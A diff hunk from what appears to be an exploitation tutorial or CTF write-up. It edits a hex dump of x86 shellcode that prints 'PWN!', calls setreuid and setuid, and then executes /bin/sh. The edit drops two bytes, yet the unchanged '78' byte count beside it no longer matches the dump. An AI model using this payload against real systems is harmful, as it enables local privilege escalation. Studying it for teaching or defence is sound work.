@@ -281,7 +281,7 @@ No shellcode is involved at this level: the program already contains the `system
    ```
    objcopy -O binary --only-section=.text /tmp/l2.o /tmp/l2.bin
    xxd -p /tmp/l2.bin
-   # 31c0506850574e2189e131db4331d2b20431c0b004cd8031c0b0c9cd8089
+   # 31c0506850574e2189e131db4331d2b204b004cd8031c0b0c9cd8089
    # c389c131c0b046cd8031c0b0c9cd8089c331c0b017cd8031c050682f2f73
    # 68682f62696e89e3505389e131d2b00bcd80
    wc -c /tmp/l2.bin      # 78
